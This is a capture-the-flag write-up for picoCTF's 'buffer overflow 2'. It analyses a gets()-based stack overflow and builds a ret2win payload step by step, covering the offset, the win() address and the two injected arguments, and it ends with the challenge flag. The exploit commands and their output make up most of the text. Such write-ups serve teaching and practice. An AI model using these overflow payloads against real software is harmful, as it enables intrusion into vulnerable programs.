# buffer overflow 2
## Question
>  Alright, this time you'll need to control some arguments. Can you get the flag from this [program](files/vuln)? You can find it in `/problems/buffer-overflow-2_4_ca1cb0da49310dd45c811348a235d257` on the shell server. [Source](files/vuln.c). 

## Hint
>Try using gdb to print out the stack once you write to it!

# Solution
## Code Analysis
Let's have a look at the code. The main function asks for a string and calls the `vuln` function:
```c
int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}
```

The `vuln` function sets a buffer of 100 bytes, puts the string on it and displays it.
```c
define BUFSIZE 100

// ...
// [SNIP]
// ...

void vuln(){
  char buf[BUFSIZE];
  gets(buf);
  puts(buf);
}
```

The first objective is obviously to jump to the `win` function where our flag will be displayed:
```c
#define FLAGSIZE 64

void win(unsigned int arg1, unsigned int arg2) {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  if (arg1 != 0xDEADBEEF)
    return;
  if (arg2 != 0xDEADC0DE)
    return;
  printf(buf);
}
```

As you can see though, the flag will only be displayed once the 2 arguments passed to this function are correct.

## First part: call the "win" function
We can execute this first part locally (on your machine). Make sure you have setup your system to run 32bit executables.

Let's find the address of the segfault.
~~~~
$ python -c "print 'A'*112" | ./vuln 
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Segmentation fault (core dumped)
$ dmesg | tail
[    7.729480] AVX2 version of gcm_enc/dec engaged.
[    7.729481] AES CTR mode by8 optimization enabled
[   19.494662] Bluetooth: RFCOMM TTY layer initialized
[   19.494667] Bluetooth: RFCOMM socket layer initialized
[   19.494671] Bluetooth: RFCOMM ver 1.11
[   21.002090] rfkill: input handler disabled
[   77.448898] show_signal_msg: 30 callbacks suppressed
[   77.448900] vuln[1824]: segfault at fbad2883 ip 00000000080486cf sp 00000000fbad2883 error 4 in vuln[8048000+1000]
[   77.448905] Code: f4 e8 05 fe ff ff 83 c4 10 83 ec 0c 68 d1 87 04 08 e8 a5 fd ff ff 83 c4 10 e8 83 ff ff ff b8 00 00 00 00 8b 4d fc c9 8d 61 fc <c3> 55 57 56 53 e8 27 fe ff ff 81 c3 27 19 00 00 83 ec 0c 8b 6c 24
[   90.121523] traps: vuln[1916] general protection fault ip:8048600 sp:ffb75e80 error:0 in vuln[8048000+1000]
~~~~

OK, we don't have the address of the segfault. Let's increase our string of 4 more bytes:
~~~~
$ python -c "print 'A'*116" | ./vuln 
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Segmentation fault (core dumped)
$ dmesg | tail
[   19.494662] Bluetooth: RFCOMM TTY layer initialized
[   19.494667] Bluetooth: RFCOMM socket layer initialized
[   19.494671] Bluetooth: RFCOMM ver 1.11
[   21.002090] rfkill: input handler disabled
[   77.448898] show_signal_msg: 30 callbacks suppressed
[   77.448900] vuln[1824]: segfault at fbad2883 ip 00000000080486cf sp 00000000fbad2883 error 4 in vuln[8048000+1000]
[   77.448905] Code: f4 e8 05 fe ff ff 83 c4 10 83 ec 0c 68 d1 87 04 08 e8 a5 fd ff ff 83 c4 10 e8 83 ff ff ff b8 00 00 00 00 8b 4d fc c9 8d 61 fc <c3> 55 57 56 53 e8 27 fe ff ff 81 c3 27 19 00 00 83 ec 0c 8b 6c 24
[   90.121523] traps: vuln[1916] general protection fault ip:8048600 sp:ffb75e80 error:0 in vuln[8048000+1000]
[  103.519655] vuln[1933]: segfault at 41414141 ip 0000000041414141 sp 00000000ffdc1d90 error 14 in libc-2.27.so[f7d9a000+1d5000]
[  103.519663] Code: Bad RIP value.
~~~~

OK, we know that our string should be 112 bytes long. Now, let's find out the address of our `win` function:
~~~~
$ readelf -s vuln | grep win
    66: 080485cb   123 FUNC    GLOBAL DEFAULT   14 win
~~~~

Our `win` function is located at memory address `0x80485cb`. Let's encode it:
~~~~
$ python -c "import struct; print(repr(struct.pack('<I', 0x80485cb)))"
'\xcb\x85\x04\x08'
~~~~

or with the `pwn` module:
~~~~
$ python -c "import pwn; print(pwn.p32(0x80485cb))"
b'\xcb\x85\x04\x08'
~~~~

Now let's exploit that locally to see if we jump to the `win` function:
~~~~
$ python -c "print 'A'*112 + '\xcb\x85\x04\x08'" | ./vuln 
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅
Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.
~~~~

OK, looks like it's working because we see the message indicating that the flag file is missing. Let's create a fake one:
~~~~
$ echo -n "picoCTF{thisistheflag}" > flag.txt
$ python -c "print 'A'*112 + '\xcb\x85\x04\x08'" | ./vuln 
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅
Segmentation fault (core dumped)
~~~~

## Second part: inject the arguments
Now, we are able to jump to the `win` function, but this latest expects 2 parameters. Let's first encode them:
~~~~
$ python
Python 3.8.2 (default, Apr  1 2020, 15:52:55) 
[GCC 9.3.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import pwn
>>> pwn.p32(0xdeadbeef)
b'\xef\xbe\xad\xde'
>>> pwn.p32(0xdeadc0de)
b'\xde\xc0\xad\xde'
~~~~

Now, we can build our payload. It will concatenate these items:
* `'A' * 112` to overflow the string buffer
* `'\xcb\x85\x04\x08'` is the address of the `win` function where we want to jump
* `'B'*4`: we need to add 4 bytes for the return address of the `win` function (stack = EBP > return address > 1st arg > 2nd arg)
* `'\xef\xbe\xad\xde'`: our first argument
* `'\xde\xc0\xad\xde'`: our second argument

Let's try locally:
~~~~
$ python -c "print 'A'*112 + '\xcb\x85\x04\x08' + 'B'*4 + '\xef\xbe\xad\xde' + '\xde\xc0\xad\xde'" | ./vuln 
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅BBBBﾭ�����
picoCTF{thisistheflag}Segmentation fault (core dumped)
~~~~

It works. Now, let's execute that on the server:
~~~~
$ python -c "print 'A'*112 + '\xcb\x85\x04\x08' + 'B'*4 + '\xef\xbe\xad\xde' + '\xde\xc0\xad\xde'" | ./vuln
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBﾭ�����
picoCTF{addr3ss3s_ar3_3asy30723282}Segmentation fault (core dumped)
~~~~

# Flag
`picoCTF{addr3ss3s_ar3_3asy30723282}`
